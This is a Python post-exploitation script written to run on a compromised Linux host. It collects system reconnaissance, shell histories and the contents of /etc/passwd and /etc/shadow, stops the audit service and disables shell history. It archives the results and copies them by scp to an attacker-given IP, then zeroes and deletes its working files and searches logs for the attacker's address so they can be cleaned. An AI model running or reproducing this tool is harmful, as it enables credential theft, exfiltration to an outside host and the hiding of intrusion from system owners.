#! /usr/bin/env python
# script to run once on target
# used to determine whether or not to continue
# and gather information

from datetime import *
import os, sys
import subprocess
import socket
from glob import *
import argparse

##########################################
## get input arguments
## file, ip to scp to
##########################################

parser=argparse.ArgumentParser(description='run on target and send info to -d destination IP and -f file location')
parser.add_argument('-f','--file',help='string of where you want the final info file to be sent to', required=False,default="/tmp/")
parser.add_argument('-d','--destinationIP',help='the ip you want the final info file to be sent to',required=True)
args=parser.parse_args()

IPandLoc=args.destinationIP+":"+args.file
#print(IPandLoc)
##########################################
## preliminary data
# date - time to clean logs from
# ifconfig - right box?
## hostname
## uname -a
## cat/ etc/*release
## free -m # available memory
# who else is there?
## w
## last
## whoami - permissions you currently have
# what is running?
## netstat -auntp
## ps -efH
## uptime
## crontab -l

#unset HISTFILE
#unset HISTSIZE
#unset HISTFILESIZE

# is privilege escalation is needed?
##########################################

def preLim():
    everything=[]
    everything.append("Label: date on target")
    everything.append(datetime.now())

    ntwk=bashCmd("ifconfig")
    ntwk=ntwk[0].split('\n\n')
    netInfo={'Up':[()],'Down':[()]}
    for i in range (0,len(ntwk)-1):
        tmp=ntwk[i].split('\n')
        if ("UP" in tmp[0]) and ("inet" in tmp[1]):
            dev=tmp[0].split(':')[0]
            ip=tmp[1].split()[1]
            netm=tmp[1].split()[3]
            netInfo['Up'].append((dev,ip,netm))
    
        elif "UP" in tmp[0]:
            dev=tmp[0].split(':')[0]
            netInfo['Up'].append(dev)
        else:
            dev=tmp[0].split(':')[0]
            netInfo['Down'].append(dev)
    up="Up:\n"
    for i in netInfo['Up']:
        for j in i:
            up+=j+" "
        up+="\n"
    down="Down:\n"
    for i in netInfo['Down']:
        for j in i:
            down+=j+ " "

    everything.append("Label: ifconfig")
    everything.append(up+"\n"+down)
    everything.append("Label: hostname:")
    everything.append(socket.gethostname())
    everything.append("Label: uname-a")
    everything.append(bashCmd("uname -a")[0])
    
    osRel=""
    temp=""
    for name in glob('/etc/*'):
        if "release" in name:
            with open (name,'r') as f:
                temp=f.readlines();
    for i in temp:
        osRel+=i
    
    everything.append("Label: OS Release Info")
    everything.append(osRel)
    everything.append("Label: free -m")
    everything.append(bashCmd("free -m")[0])
    everything.append("Label: user logins")
    everything.append(bashCmd("w")[0])
    everything.append("Label: last user logged in")
    everything.append(bashCmd('last')[0])
    everything.append('Label: I am')
    everything.append(bashCmd("whoami")[0]) 
    everything.append("Label: netstat")
    everything.append(bashCmd("netstat -antup")[0])
    everything.append("Label: processes")
    everything.append(bashCmd("ps -efH")[0])
    everything.append("Label: uptime")
    everything.append(bashCmd("uptime")[0])
    #print("before cron")
    #everything.append("Label: cron")
    #everything.append(bashCmd("crontab -l"))
    #print("after cron")
    
    for i in range(0,len(everything)):
        w2File(everything[i],"final")

    w2File("#! /bin/sh","hist.sh",2)
    w2File("unset HISTFILE","hist.sh",2)
    w2File("unset HISTSIZE","hist.sh",2)
    w2File("unset HISTFILESIZE","hist.sh",2)
    bashCmd("chmod +x /tmp/info/hist.sh")
    result=bashCmd("/tmp/info/hist.sh")
    


##########################################
## other, less critical info
# cd /tmp
# service audit stop
# lsof -l nP # show opened file handles to ps's
# lsb_release 
# grep -v "^#||^$" /etc/crontab /var/spool/cron/crontabs/* /etc/cron.* /etc/cron.d/* /var/spool/cron/atjobs/* 2>/dev/null
# atq
# ...
##########################################

def nextStuff():
    every=[]
    os.chdir('/tmp')
    try:
        result=bashCmd("service audit stop")
    except:
        result=bashCmd("systemctl stop audit")
    #if(result==1): every.append("auditting stopped")
    #else: print("audit on")
    #every.append("Label: lsof -l nP")
    #every.append(bashCmd("lsof -l nP")[0])
    every.append("Label: lsb_release")
    every.append(bashCmd("lsb_release")[0])
    every.append("Label: grep for cronjobs")
    every.append(bashCmd("grep -v \"^#||^$\" /etc/crontab /var/spool/cron /crontabs/*"+
        " /etc/cron.* /etc/cron.d/* /va/spool/cron/atjobs/* 2>/dev/null")[0])
    try:
        every.append("Label: atq")
        every.append(bashCmd("atq")[0])
    except:
        pass # print("no atq")
    
    every.append("Label: history")
    every.append(bashCmd("cat /root/.bash_history /home/*/*history"))
    every.append("Label: find \".*\" files")
    every.append(bashCmd("find / -type f -name \".*\""))
    every.append("Label: find \".*\" directories")
    every.append(bashCmd("find / -type d -name \".*\""))
    every.append("Label: service status")
    every.append(bashCmd("service --status-all"))
    try:
        every.append("Label: check configs")
        every.append(bashCmd("chkconfig --list"))
    except:
        every.append("no chkconfig")
    try: 
        result=bashCmd("ulimit -c",1)
        every.append("Label: ulimit -c")
        every.append("ulimit -c: "+result)
    except: pass # print("no ulimit")
    ''' 
    every.append("Label: ls /home")
    every.append(bashCmd("ls -laR /home"))
    every.append("Label: ls /")
    every.append(bashCmd("ls -laR / "))
    every.append("Label: find special perm files")
    every.append(bashCmd("find / -uid 0 -perm -4000"))
    '''
    for i in range(0,len(every)):
        w2File(every[i],"final")
    

def getLogs():
    every=[]
    every.append("Label: find recently touched logs")
    every.append(bashCmd("find /var/log -type f -mmin -30"))
    every.append("Label: find logs w/ ip "+args.destinationIP)
    every.append(bashCmd("grep -n \""+args.destinationIP+"\" /var/log/*"))

    for i in range(0,len(every)):
        w2File(every[i],"final")


##########################################
## functions

## function to call a bash command in python3
def bashCmd(cmd,i=0):    
    cmd2=cmd.split()
    if(i==0):
        result=subprocess.Popen(cmd2,stdout=subprocess.PIPE,
                stderr=subprocess.PIPE, shell=True).communicate()
    else:
        result=subprocess.run(cmd2,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True).stdout.decode('utf-8')
    return result; #cmd,result);

## write to a file
## result is a list of information that will be inputted line by line
## filename is the name of the file to be written to
## and finally, i is an optional setting
### i != 0 is only used to overwrite files (used by logClean)
def w2File(result,filename,i=0):
    if(i==0):
        with open("/tmp/info/"+filename,'a') as f:
            f.write(str(result)+"\n")
            sep="------------------------------------"
            f.write(sep+sep+"\n")
        #for r in result:
        #    print(r[0],"\n",r[1],file=f)
    elif(i==2):
        with open("/tmp/info/"+filename,'a') as f:
            f.write(str(result)+"\n")
    else:
        with open("/tmp/info/"+filename,'w') as f:
            f.write(str(result)+"\n")

def xferFile(dfile,IPandLoc):
    # encode and gzip, then xfer
    # uuencode -m <file to encode>
    # ssh <IP> uuencode -m /bin/ls - | unudecode > ls
    os.chdir("/tmp/info")
    zfile=bashCmd("tar -czvf "+dfile+".tar.gz "+dfile)
    #print(zfile)
    bashCmd("scp /tmp/info/"+dfile+".tar.gz root@"+IPandLoc)

## this function lists all logs touched today, sends info files to IP/folder location
## zeros out files and removes all info files
### IPandLoc = IP and file location to send files
### ex: "192.168.10.10:/root/Desktop"
def logClean(IPandLoc):
    ''' last two commands in nextStuff()
    try:
        ## will find all logs touched today - up to you to go clean them
        ## logClean.py to come
        today=datetime.now()
        months=["Jan","Feb","Mar","Apr","May","Jun",
                "Jul","Aug","Sep","Oct","Nov","Dec"]
        logs=bashCmd("ls -latr /var/log")
        ## the following grabs the logs and checks to see if they have
        ## been touched today. Further analysis is for you
        logs=logs.split("\n")
        logsToClean=[]
        for l in logs:
            if months[today.month-1]+" "+str(today.day) in l:
                logsToClean.append(l.split()[8])
        # these are the file names of logs to look into
        print("These are logs of interest:")
        for k in logsToClean:
            print(k)
    except:
        pass'''
    # xfer file
    xferFile("final",IPandLoc)
    # find all info files
    files=bashCmd("ls /tmp/info")
    files2=files.split()
    for i in files2:
        # original file
        size=bashCmd("ls -latr /tmp/info/"+i).split()
        bashCmd("dd if=/dev/zero of=/tmp/info/"+i+" bs=1 count="+size[4])
    #size=0
    #size=bashCmd("ls -latr /tmp/info/final.tar.gz").split()
    #bashCmd("dd if=/dev/zero of=/tmp/info/final.tar.gz bs=1 count="+size[4])
    bashCmd("rm -rf /tmp/info/")

def getPass():
    passwd=[]
    with open ("/etc/passwd","r") as p:
        pas=p.readlines()
        w2File("\n\n","final")
        for i in pas:
            w2File(i.split('\n')[0],"final",2)
    with open ("/etc/shadow","r") as g:
        s=g.readlines()
        w2File("\n\n","final")
        for i in s:
            w2File(i.split('\n')[0],"final",2)
        w2File("\n\n","final")

##########################################

if not os.path.exists('/tmp/info'):
    os.makedirs('/tmp/info')

#preLim()
nextStuff()
#getPass()
#getLogs()
#xferFile("preLiminary","192.168.10.30:/root/Desktop/info")
#logClean(IPandLoc)
